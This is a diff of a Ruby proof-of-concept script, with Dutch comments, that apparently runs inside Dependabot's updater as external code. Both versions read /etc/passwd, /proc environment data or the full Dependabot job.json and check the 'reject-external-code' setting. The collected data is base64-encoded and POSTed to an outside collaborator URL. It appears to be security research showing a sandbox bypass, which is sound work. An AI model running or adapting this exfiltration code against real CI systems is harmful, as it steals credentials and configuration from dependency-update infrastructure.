@@ -13,51 +13,32 @@ begin
   require "uri"
   require "json"
 
-  results = []
+  # Execution counter via /tmp file - detect which run this is
+  run_file = "/tmp/poc8_run_count"
+  run_num = File.exist?(run_file) ? IO.binread(run_file).strip.to_i + 1 : 1
+  File.write(run_file, run_num.to_s)
 
-  # 1. Hoe werd dit Ruby process gestart? Toont pad naar echte job definitie
-  results << "=== /proc/self/cmdline ===\n#{read_safe.('/proc/self/cmdline').gsub("\x00", " ")}"
-  results << "=== /proc/1/cmdline ===\n#{read_safe.('/proc/1/cmdline').gsub("\x00", " ")}"
+  results = ["=== RUN ##{run_num} ==="]
 
-  # 2. Process-level env (bevat mogelijk DEPENDABOT_JOB_PATH of UPDATER_CONFIG)
-  proc_env = read_safe.('/proc/self/environ').gsub("\x00", "\n")
-  results << "=== /proc/self/environ ===\n#{proc_env[0..2000]}"
+  # VOLLEDIGE job.json lezen zonder truncatie
+  job_raw = read_safe.('/home/dependabot/dependabot-updater/job.json')
+  results << "=== FULL job.json (#{job_raw.length} bytes) ===\n#{job_raw}"
 
-  # 3. Zoek alle JSON files die 'reject' bevatten
+  # Specifiek zoeken naar reject-external-code
   begin
-    found = []
-    ["/home/dependabot", "/tmp", "/run", "/var/run", "/etc/dependabot"].each do |dir|
-      next unless Dir.exist?(dir)
-      Dir.glob("#{dir}/**/*.json") do |f|
-        next unless File.file?(f)
-        c = read_safe.(f)
-        found << "#{f}:\n#{c[0..400]}" if c.include?("reject")
-      end
-    end
-    results << "=== JSON met 'reject' ===\n#{found.empty? ? '(geen)' : found.join("\n---\n")}"
+    job = JSON.parse(job_raw)
+    reject_val = job.dig("job", "reject-external-code")
+    results << "=== reject-external-code: #{reject_val.inspect} ==="
+    results << "=== insecure_external_code_execution: #{job.dig("job", "insecure-external-code-execution").inspect} ==="
   rescue => e
-    results << "glob ERR: #{e.message}"
+    results << "JSON parse ERR: #{e.message}"
   end
 
-  # 4. Alle bestanden in de updater dir
-  begin
-    all_files = []
-    Dir.glob("/home/dependabot/dependabot-updater/**/*").each do |f|
-      all_files << f if File.file?(f)
-    end
-    results << "=== updater bestanden ===\n#{all_files.join("\n")}"
-  rescue => e
-    results << "updater ls ERR: #{e.message}"
-  end
-
-  # 5. Huidig job.json (parse-fase stub)
-  results << "=== job.json ===\n#{read_safe.('/home/dependabot/dependabot-updater/job.json')[0..1000]}"
-
-  # 6. Bewijs van bypass: /etc/passwd
-  results << "=== /etc/passwd ===\n#{read_safe.('/etc/passwd')[0..300]}"
+  # /etc/passwd bewijs
+  results << "=== /etc/passwd bypass bewijs ===\n#{read_safe.('/etc/passwd')[0..200]}"
 
   payload = [results.compact.join("\n\n")].pack("m0")
-  post_uri = URI("#{COLLAB_URL}?poc=find_reject_flag")
+  post_uri = URI("#{COLLAB_URL}?poc=reject_true&run=#{run_num}")
   r = Net::HTTP::Post.new(post_uri)
   r.body = payload
   Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
